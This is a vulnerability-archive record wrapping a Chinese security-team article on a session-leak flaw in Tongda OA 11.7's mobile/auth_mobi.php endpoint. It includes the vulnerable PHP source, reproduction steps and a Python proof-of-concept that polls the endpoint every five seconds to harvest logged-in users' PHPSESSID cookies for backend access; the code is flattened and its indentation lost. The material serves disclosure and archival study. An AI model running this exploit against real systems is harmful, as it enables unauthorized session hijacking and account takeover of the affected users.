---
source: "MrWQ/vulnerability-paper"
title: "通达OA auth_mobi在线用户会话泄露"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "11.7实测与<11.7声明冲突"
prerequisites: "未授权但目标在线"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/5M40Oux_89dgy5QAUhULGg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%20%E5%9C%A8%E7%BA%BF%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md"
category_recommendation: "OA / 通达"
id: "vw-f99c4691cd6240b0f193c722"
entity_id: "ve-f99c4691cd6240b0f193c722"
schema_version: "1"
---

# 通达OA auth_mobi在线用户会话泄露

## 条目说明

- 对象与具体问题：通达OA；auth_mobi在线用户会话泄露
- 版本、配置及部署条件：11.7实测与<11.7声明冲突
- 认证与权限前提：未授权但目标在线
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 代码全部反引号压平丧失Python缩进；宣传及下载回复门槛
- 保留作者/社区归属，采用231可读文本及统一版本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/5M40Oux_89dgy5QAUhULGg)

**点击蓝字**

![图片](https://mmbiz.qpic.cn/mmbiz_gif/4LicHRMXdTzCN26evrT4RsqTLtXuGbdV9oQBNHYEQk7MPDOkic6ARSZ7bt0ysicTvWBjg4MbSDfb28fn5PaiaqUSng/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1)

**关注我们**

  

  

**_声明  
_**

本文作者：PeiQi  
本文字数：1338

阅读时长：15min

附件/链接：点击查看原文下载

声明：请勿用作违法用途，否则后果自负

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

  

  

  

**_前言_**

  

  

一、

**_漏洞描述_**

通达OA v11.7 中存在某接口查询在线用户，当用户在线时会返回 PHPSESSION使其可登录后台系统  
  
  

二、

**_漏洞影响_**

通达OA < v11.7  

  

**三、**

**_漏洞复现_**

通达OA v11.7下载链接（回复通达OA11.7下载）

下载后按步骤安装即可

漏洞有关文件 **MYOA\webroot\mobile\auth_mobi.php**

```
`<?php``function relogin()``{` `echo _('RELOGIN');` `exit;``}``ob_start();``include_once 'inc/session.php';``include_once 'inc/conn.php';``include_once 'inc/utility.php';``if ($isAvatar == '1' && $uid != '' && $P_VER != '') {` `$sql = 'SELECT SID FROM user_online WHERE UID = \'' . $uid . '\' and CLIENT = \'' . $P_VER . '\'';` `$cursor = exequery(TD::conn(), $sql);` `if ($row = mysql_fetch_array($cursor)) {` `$P = $row['SID'];` `}``}``if ($P == '') {` `$P = $_COOKIE['PHPSESSID'];` `if ($P == '') {` `relogin();` `exit;` `}``}``if (preg_match('/[^a-z0-9;]+/i', $P)) {` `echo _('非法参数');` `exit;``}``if (strpos($P, ';') !== false) {` `$MY_ARRAY = explode(';', $P);` `$P = trim($MY_ARRAY[1]);``}``session_id($P);``session_start();``session_write_close();``if ($_SESSION['LOGIN_USER_ID'] == '' || $_SESSION['LOGIN_UID'] == '') {` `relogin();``}`
```

在执行的 SQL语句中  

```
$sql = 'SELECT SID FROM user_online WHERE UID = \'' . $uid . '\' and CLIENT = \'' . $P_VER . '\'';
```

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAwKVoaO6WJicNllyjuqwuK4TxWz4RlnG7vzwJg0uW8zUicEPgEwIyRFb3CZkDLH4BXWOXqJenibwnmQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

简单阅读PHP源码可以知道 此SQL语句会查询用户是否在线，如在线返回此用户 Session ID

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAwKVoaO6WJicNllyjuqwuK48t2YbsW4cRiaunNYlchY7YibOLPs6CvqnvRYkf90CtWDoInOFCHNdEtg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

将返回的 Set-Cookie 中的Cookie参数值使用于登录Cookie

访问目标后台 http://xxx.xxx.xxx.xxx/general/

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAwKVoaO6WJicNllyjuqwuK4ToYnrcicLicxEnWic4ibJia6XdmntSCxCktzdb03hR00MuHmLRV0QqPmf4Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

当目标离线时则访问漏洞页面则会出现如下图

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAwKVoaO6WJicNllyjuqwuK46u9QOs5UHu3R9VCs9IzKAfP3dibZumkKbX62lhJq8iaKRbmgjiaCY8W0Q/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

5秒一次测试用户是否在线

通过此思路可以持续发包监控此页面来获取在线用户的Cookie

  

**四、**

**_Payload_**

  

```
`import requests``import sys``import random``import re``import time``from requests.packages.urllib3.exceptions import InsecureRequestWarning``def title():` `print('+------------------------------------------')` `print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')` `print('+  \033[34mVersion: 通达OA 11.7                                               \033[0m')` `print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')` `print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')` `print('+------------------------------------------')``def POC_1(target_url):` `vuln_url = target_url + "/mobile/auth_mobi.php?isAvatar=1&uid=1&P_VER=0"` `headers = {``"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",` `}``try:` `requests.packages.urllib3.disable_warnings(InsecureRequestWarning)` `response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)``if "RELOGIN" in response.text and response.status_code == 200:` `print("\033[31m[x] 目标用户为下线状态 --- {}\033[0m".format(time.asctime( time.localtime(time.time()))))``elif response.status_code == 200 and response.text == "":` `PHPSESSION = re.findall(r'PHPSESSID=(.*?);', str(response.headers))` `print("\033[32m[o] 用户上线 PHPSESSION: {} --- {}\033[0m".format(PHPSESSION[0] ,time.asctime(time.localtime(time.time()))))``else:` `print("\033[31m[x] 请求失败，目标可能不存在漏洞")` `sys.exit(0)``except Exception as e:` `print("\033[31m[x] 请求失败 \033[0m", e)``if __name__ == '__main__':` `title()` `target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))``while True:` `POC_1(target_url)` `time.sleep(5)`
```

**效果**  

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzAwKVoaO6WJicNllyjuqwuK4VstmrBiaRveSLrSSzFgwibTDbicD4MBPDdzKiaZMgjRdEdj9Qf78ImZoHg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

**团队【PeiQi】师傅的微信二维码放在这了**

  

![图片](https://mmbiz.qpic.cn/mmbiz_png/4LicHRMXdTzBVvicBFUlseTHFTXALE0D9XhJILPG5qnhYyI1fjI4vqjV0MgnUM4ibYRfCFaV4wk5FRaGibxMptiadRw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

  

  

  

**_扫描关注公众号回复加群_**

**_和师傅们一起讨论研究~_**

  

**长**

**按**

**关**

**注**

**WgpSec狼组安全团队**

微信号：wgpsec

Twitter：@wgpsec

  





---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
